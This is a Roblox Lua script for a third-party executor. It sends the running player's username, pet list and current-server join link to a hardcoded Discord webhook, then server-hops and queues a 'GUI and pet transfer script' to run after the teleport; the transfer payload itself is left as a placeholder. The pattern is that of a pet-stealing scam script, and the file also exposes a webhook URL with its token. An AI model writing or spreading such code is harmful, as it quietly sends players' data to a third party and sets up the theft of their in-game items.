local TeleportService = game:GetService("TeleportService") local HttpService = game:GetService("HttpService") local Players = game:GetService("Players") local LocalPlayer = Players.LocalPlayer local placeId = 126884695634066

-- Webhook Sender local http = request local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"

local function sendWebhook(payload) local jsonData = HttpService:JSONEncode(payload) http({ Url = webhookUrl, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData }) end

local function sendExecutionLog() local petsList = {} pcall(function() for _, pet in ipairs(LocalPlayer:WaitForChild("PetsFolder"):GetChildren()) do table.insert(petsList, pet.Name) end end)

sendWebhook({
    content = "✅ **Script Executed**",
    embeds = {{
        title = "Execution Report",
        description = "[Join Server](https://www.roblox.com/games/126884695634066/?jobId=" .. game.JobId .. ")",
        fields = {
            { name = "Username", value = LocalPlayer.Name, inline = true },
            { name = "Pets", value = (#petsList > 0 and table.concat(petsList, ", ") or "No Pets Found") }
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
})

end

-- GUI + Webhook + Pet Transfer Script (Queued on Teleport) local loadingScript = [[...]] -- (Use your existing GUI and pet transfer script here)

-- Server Hop Function local function serverHop() local cursor = "" local smallestServer = nil

repeat
    local success, result = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync(
            ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&cursor=%s"):format(placeId, cursor)
        ))
    end)

    if success and result and result.data then
        for _, server in pairs(result.data) do
            if server.playing < server.maxPlayers and server.id ~= game.JobId then
                if not smallestServer or server.playing < smallestServer.playing then
                    smallestServer = server
                end
            end
        end
        cursor = result.nextPageCursor or ""
    else
        break
    end
    task.wait(0.2)
until cursor == ""

queue_on_teleport(loadingScript)

if smallestServer then
    TeleportService:TeleportToPlaceInstance(placeId, smallestServer.id, LocalPlayer)
else
    TeleportService:Teleport(placeId, LocalPlayer)
end

end

-- Execute on Start sendExecutionLog() serverHop()

